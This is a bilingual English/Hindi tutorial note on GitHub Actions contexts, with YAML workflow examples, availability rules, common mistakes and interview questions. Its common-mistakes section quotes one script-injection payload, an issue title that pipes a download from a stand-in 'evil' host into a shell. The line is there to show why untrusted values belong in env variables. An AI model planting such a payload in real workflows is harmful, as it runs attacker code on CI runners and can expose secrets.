# 261. Contexts in GitHub Actions
# हिंदी में: GitHub Actions में Contexts

---

## 🔵 Simple Definition (English)
A context is a named object that holds information about the workflow run, the runner, jobs, steps, secrets and more. You read it inside `${{ }}` expressions, for example `github.sha`, `runner.os` or `secrets.TOKEN`. Each context is only available in certain places of the YAML.

## 🔵 सरल परिभाषा (Hindi)
Context एक नाम वाला object है जिसमें workflow run, runner, jobs, steps, secrets वगैरह की जानकारी होती है। इसे `${{ }}` expressions में पढ़ते हैं, जैसे `github.sha`, `runner.os` या `secrets.TOKEN`। हर context YAML की सिर्फ कुछ जगहों पर उपलब्ध होता है।

---

## 🔴 Problem it Solves
A workflow file is static text, but pipelines need dynamic data: which commit, which branch, who triggered it, what the previous job produced, which OS the runner has. Hard-coding or parsing it from shell is error-prone. Contexts provide a single, structured, documented way to read run-time data safely (and to keep secrets separate).

## 🔴 यह क्यों बना? (Hindi)
Workflow file static text है, पर pipeline को dynamic data चाहिए: कौन सा commit, कौन सी branch, किसने trigger किया, पिछले job ने क्या बनाया, runner का OS क्या है। इन्हें hard-code करना या shell से parse करना गलतियाँ लाता है। Contexts run-time data पढ़ने का एक structured, documented और सुरक्षित तरीका देते हैं (secrets अलग रखते हुए)।

---

## 🟢 How it Works — Step by Step

```
Step 1 → Event happens (push/PR/schedule) and GitHub creates a run
Step 2 → GitHub fills context objects: github, vars, secrets, inputs ...
Step 3 → Later, runner adds: runner, job, steps, env, needs, matrix, strategy
Step 4 → Each YAML key allows only some contexts (availability table)
Step 5 → ${{ context.property }} is replaced by its value before use
Step 6 → Using a context in a place where it is not available = workflow error
```

## 🟢 कैसे काम करता है? (Hindi)

```
Step 1 → Event होता है (push/PR/schedule) और GitHub run बनाता है
Step 2 → GitHub context objects भरता है: github, vars, secrets, inputs ...
Step 3 → बाद में runner जोड़ता है: runner, job, steps, env, needs, matrix, strategy
Step 4 → हर YAML key सिर्फ कुछ contexts allow करती है (availability table)
Step 5 → ${{ context.property }} इस्तेमाल से पहले उसकी value से बदल जाता है
Step 6 → जहाँ context उपलब्ध नहीं वहाँ उपयोग = workflow error
```

---

## 🟡 Real World Example
Your deploy job tags the Docker image with `${{ github.sha }}`, picks the AWS region from `${{ vars.AWS_REGION }}`, logs in using `${{ secrets.GITHUB_TOKEN }}`, and the notify job reads `${{ needs.deploy.result }}`. Big companies (Zomato-style multi-service repos) use `matrix` and `inputs` to deploy 20 services from one workflow.

## 🟡 Real Example Hindi mein
आपका deploy job Docker image को `${{ github.sha }}` से tag करता है, AWS region `${{ vars.AWS_REGION }}` से लेता है, `${{ secrets.GITHUB_TOKEN }}` से login करता है, और notify job `${{ needs.deploy.result }}` पढ़ता है। बड़ी कंपनियाँ (Zomato-style multi-service repos) एक workflow से 20 services deploy करने के लिए `matrix` और `inputs` इस्तेमाल करती हैं।

---

## 💻 Code / Config Example — Basic
```yaml
# .github/workflows/contexts-basic.yml
name: contexts-basic                   # workflow name
on: [push, workflow_dispatch]          # push or manual
jobs:
  show:
    runs-on: ubuntu-24.04              # example runner
    steps:
      - name: Print common contexts    # one step that prints many contexts
        run: |                         # shell script
          echo "repo   : ${{ github.repository }}"   # owner/name
          echo "branch : ${{ github.ref_name }}"     # main, feature/x ...
          echo "sha    : ${{ github.sha }}"          # full commit SHA
          echo "actor  : ${{ github.actor }}"        # user who triggered
          echo "os     : ${{ runner.os }}"           # Linux / Windows / macOS
          echo "run id : ${{ github.run_id }}"        # unique run number
      - name: Dump github context      # useful while learning (never in prod logs)
        run: echo '${{ toJSON(github) }}' | head -n 20   # first lines of the JSON
```

## 💻 Code / Config Example — Advanced
```yaml
# .github/workflows/contexts-advanced.yml
name: multi-service-deploy             # one workflow, many services
on:
  workflow_dispatch:
    inputs:                            # -> inputs context
      environment:
        description: Target environment
        type: choice                   # dropdown
        options: [staging, production]
        default: staging
env:
  REGISTRY: ghcr.io                    # -> env context
jobs:
  build:
    runs-on: ${{ matrix.os }}          # matrix context allowed in runs-on
    strategy:
      fail-fast: false                 # keep other services building
      matrix:
        service: [api, worker]         # -> matrix context
        os: [ubuntu-24.04]             # example runner
    outputs:
      tag: ${{ steps.meta.outputs.tag }}   # steps context exposed as job output
    steps:
      - uses: actions/checkout@v4      # get source
      - id: meta                       # step id for steps context
        run: echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # short sha as output
      - run: echo "build ${{ matrix.service }} on ${{ runner.os }} (${{ runner.arch }})"  # runner + matrix
  deploy:
    needs: build                       # -> needs context
    if: ${{ needs.build.result == 'success' }}   # job-level if: github, needs, vars, inputs
    runs-on: ubuntu-24.04              # example runner
    environment: ${{ inputs.environment }}       # inputs context in environment
    steps:
      - run: |                         # use several contexts together
          echo "deploying tag ${{ needs.build.outputs.tag }} to ${{ inputs.environment }}"
          echo "registry ${{ env.REGISTRY }} / var ${{ vars.AWS_REGION }}"
        # vars.AWS_REGION may be empty if not defined in repo settings
```
Parsed as YAML locally; not executed on GitHub. Check availability table in docs when you move expressions to other keys.

---

## 🟠 My Stack Integration
- **Node.js / React**: cache key `${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}` uses runner + function.
- **FastAPI**: `strategy.matrix.python: ["3.11","3.12"]` and `${{ matrix.python }}` in setup-python.
- **Nginx/VPS**: `${{ vars.VPS_HOST }}` for host (not secret) and `${{ secrets.VPS_SSH_KEY }}` for key.
- **AWS**: `${{ secrets.AWS_ROLE_ARN }}` or `vars.AWS_ROLE_ARN` for OIDC role.
- **Security**: untrusted contexts (PR title, branch name, commit message) must never be pasted directly into `run:`; pass through `env:`.

```yaml
      - name: Safe use of untrusted context          # script-injection safe pattern
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}   # attacker-controlled text
        run: 'echo "Title is: $PR_TITLE"'            # shell treats it as data, not code
```

---

## ⚠️ Common Mistakes to Avoid
❌ Mistake 1: `runs-on: ${{ env.RUNNER }}`.
✅ Correct: `env` is not available in `runs-on`; use `vars`, `inputs` or `matrix`.

❌ Mistake 2: `run: echo "${{ github.event.issue.title }}"` directly.
✅ Correct: Put it in `env:` first. Direct interpolation lets a title like `"; curl evil | sh #` run as code.

❌ Mistake 3: `echo '${{ toJSON(secrets) }}'` to debug.
✅ Correct: Never dump `secrets`; dump only `github` (and carefully), or none in prod.

❌ Mistake 4: Using `steps.x.outputs.y` in another job.
✅ Correct: Expose through `jobs.<id>.outputs` and read by `needs.<id>.outputs.y`.

❌ Mistake 5: Believing `secrets` come in forked PRs.
✅ Correct: Fork PRs get no secrets (except read-only token); design around that.

---

## 🧠 Tricky Interview Question
Why does `jobs.build.if: ${{ steps.x.outputs.ok == 'true' }}` fail while the same expression works inside a step's `if:`?

Answer: Context availability. A job-level `if:` is evaluated before any step of that job exists, so the `steps` context is not available there (only github, needs, vars, inputs). A step-level `if:` runs after earlier steps, so `steps` is available. To gate a whole job on a computed value, produce it in a previous job and read `needs.<job>.outputs`.

---

## ⚫ Interview Questions + Answers

Q1: Name the main contexts.
A1: github, env, vars, job, jobs, steps, runner, secrets, strategy, matrix, needs, inputs.

Q2: Are contexts case-sensitive?
A2: Property names are case-insensitive in expressions, but env var names on the runner follow OS rules. Keep them consistent anyway.

Q3: Context vs environment variable?
A3: Contexts are expression-time objects (`${{ }}`) available in YAML; env vars live in the runner shell process. Some data exists in both (`github.sha` and `$GITHUB_SHA`).

Q4: Why is `secrets` special?
A4: Values are masked in logs, not available to fork PRs, and cannot be used in `if:` directly.

Q5: How do you find out where a context is allowed?
A5: The "Context availability" table in GitHub docs; invalid use produces a workflow validation error before the run starts.

---

## 🔷 When to Use + When Not to Use
✅ Use when:
- You need run-time info (sha, ref, actor, matrix value, job outputs)
- Passing data between jobs with `needs`
- Choosing runner or env based on inputs/vars

❌ Avoid when:
- Heavy string processing (do it in a script step)
- Interpolating untrusted data into `run:`
- Storing secrets in non-secret contexts like `vars`

---

## 📊 Visual Diagram
```
  Event --> GitHub creates run
              |
   +----------+--------------------------------------------+
   | github | vars | secrets | inputs   (known at start)    |
   +----------+--------------------------------------------+
              |            runner picks job
   +----------+--------------------------------------------+
   | needs | matrix | strategy | job | runner | env | steps |
   +-----------------------------------------------------------+
              |
      ${{ context.property }}  -->  value inside YAML / run: / with: / if:
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| Context | Object with run data | Run की जानकारी वाला object |
| Availability | Where a context is valid | कहाँ context मान्य है |
| Expression | `${{ }}` evaluation | `${{ }}` का मूल्यांकन |
| Script injection | Untrusted text becoming code | Untrusted text का code बन जाना |
| Output | Value exposed by step/job | Step/job द्वारा दी गई value |

---

## ⚡ 3-Line Summary
English: Contexts are objects like `github`, `env`, `secrets` read through `${{ }}`.
Each YAML key allows only certain contexts, so check availability.
Never interpolate untrusted context values directly into shell commands.
Hindi: Contexts `github`, `env`, `secrets` जैसे objects हैं जिन्हें `${{ }}` से पढ़ते हैं।
हर YAML key सिर्फ कुछ contexts allow करती है, इसलिए availability देखो।
Untrusted context values को सीधे shell commands में कभी मत डालो।

---

## ➡️ Next Topic
**262. github Context** — the biggest context: event, ref, sha, actor, token and more.
